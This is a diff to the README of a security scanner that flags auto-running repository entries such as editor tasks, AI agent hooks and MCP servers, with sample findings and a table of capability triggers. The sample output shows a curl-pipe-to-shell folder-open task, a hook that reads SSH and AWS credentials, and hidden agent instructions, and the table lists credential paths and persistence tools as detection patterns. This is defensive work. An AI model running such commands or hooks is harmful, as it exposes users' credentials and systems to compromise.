@@ -11,7 +11,7 @@
 enter its directory, install it, start an AI agent in it, or simply start Python. It points
 out the entries that look like payloads.
 
-![autorun-audit scanning a demo repository before cloning it: two critical findings (a folder-open task that pipes a download into a shell, and hidden instructions in AGENTS.md) and two high ones (a dev container host command and an unpinned MCP server)](https://raw.githubusercontent.com/ag3ntsc4rn/autorun-audit/main/docs/demo.gif)
+![autorun-audit scanning a demo repository before cloning it: three critical findings (an agent hook whose script reads ~/.ssh and ~/.aws and sends data over the network, a folder-open task that pipes a download into a shell, and hidden instructions in AGENTS.md) and two high ones (a dev container host command and an unpinned MCP server)](https://raw.githubusercontent.com/ag3ntsc4rn/autorun-audit/main/docs/demo.gif)
 
 The scan above targets [autorun-audit-demo](https://github.com/ag3ntsc4rn/autorun-audit-demo), a public repository of harmless, defanged samples. Try it yourself:
 
@@ -22,10 +22,20 @@ The scan above targets [autorun-audit-demo](https://github.com/ag3ntsc4rn/autoru
 $ uvx autorun-audit repo https://github.com/ag3ntsc4rn/autorun-audit-demo
 autorun-audit https://github.com/ag3ntsc4rn/autorun-audit-demo
 
+ CRITICAL  .claude/settings.json:6  [claude.hook]
+  runs when: Claude Code PostToolUse event
+  Claude Code runs this PostToolUse hook automatically.
+  $ ./scripts/format.sh
+  can: run shell commands · use the network · read credentials (~/.ssh, ~/.aws)
+  inspected: scripts/format.sh
+  ! reads credentials and can send data over the network
+
  CRITICAL  .vscode/tasks.json:5  [vscode.task.folder-open]
   runs when: folder opened in VS Code / Cursor / Windsurf (trusted workspace)
   Task 'install deps' is set to run automatically on folder open.
   $ curl -fsSL https://example.invalid/setup.sh | sh
+  can: run shell commands · use the network
+  starts: curl, sh
   ! downloads and pipes into a shell
 
  CRITICAL  AGENTS.md:3  [agent.instructions.invisible-unicode]
@@ -42,8 +52,10 @@ autorun-audit https://github.com/ag3ntsc4rn/autorun-audit-demo
   runs when: Claude Code starts a session with this server enabled
   MCP server 'docs' starts a local process; fetches 'acme-docs-mcp' without a pinned version, so it runs whatever is latest.
   $ npx -y acme-docs-mcp
+  can: use the network
+  starts: npx
 
-4 finding(s): 2 critical, 2 high
+5 finding(s): 3 critical, 2 high
 ```
 
 </details>
@@ -145,6 +157,45 @@ Exit codes: `0` when nothing reaches `--fail-on`, `1` when something does, `2` f
 | `.pth` lines from well-known tools, verified by owner | `pth.import-line.known` (info) |
 | PEP 829 `.start` entry points (Python 3.15+), including invalid ones | `start.*` |
 | `sitecustomize.py` / `usercustomize.py` | `python.customize-module` |
+
+### What each finding can do
+
+Every finding that runs something also says **what it can do**, so a hook that quietly reads
+your SSH keys doesn't look the same as one that runs a formatter:
+
+```console
+ CRITICAL  .claude/settings.json:6  [claude.hook]
+  runs when: Claude Code PostToolUse event
+  $ ./scripts/format.sh
+  can: run shell commands · use the network · read credentials (~/.ssh, ~/.aws)
+  inspected: scripts/format.sh
+  ! reads credentials and can send data over the network
+```
+
+| Capability | Examples of what triggers it |
+|---|---|
+| run shell commands | shell scripts, pipes and `&&` chains, `sh -c`, `eval`, `subprocess`, `child_process` |
+| use the network | `curl`, `wget`, `ssh`, URLs, `npx`/`uvx`, `pip install`, `requests`, `fetch(` |
+| write or delete files | redirects, `rm`, `mv`, `chmod`, `git config`, `open(..., "w")`, `fs.write…` |
+| read credentials | `~/.ssh`, `~/.aws`, `~/.kube`, `.env`, `.npmrc`, keychains, `*_TOKEN` / `*_SECRET` variables |
+| set itself up to run again | `.bashrc`/`.zshrc`, `crontab`, `launchctl`, `core.hooksPath`, writing hooks or `.pth` files |
+| use admin rights | `sudo`, `doas`, `pkexec` |
+
+- **Scripts are followed.** When a command calls a script in the repository (`./scripts/x.sh`,
+  `python tools/x.py`, `node server.js`), that script is read and analyzed too, up to two levels
+  deep. Scripts are only ever read, never run. Paths outside the repository, including through
+  symlinks, are refused, and binary or very large files are reported as not inspected.
+- **Dangerous combinations are critical**: reading credentials plus network access, or network
+  access plus persistence. `sudo` raises a finding to at least high.
+- **Programs outside the repository aren't inspected.** They're listed under `starts:` so you can
+  see what a command depends on.
+- **Editing a followed script brings back an allowlisted finding,** because the script's
+  hash is part of the fingerprint.
+- JSON output has `capabilities`, `evidence` (which file and line triggered each one),
+  `analyzed_files` and `programs`.
+
+This is pattern matching on text: obfuscated code can hide what it does. It's a strong signal,
+not a guarantee.
 
 ### Severity
 
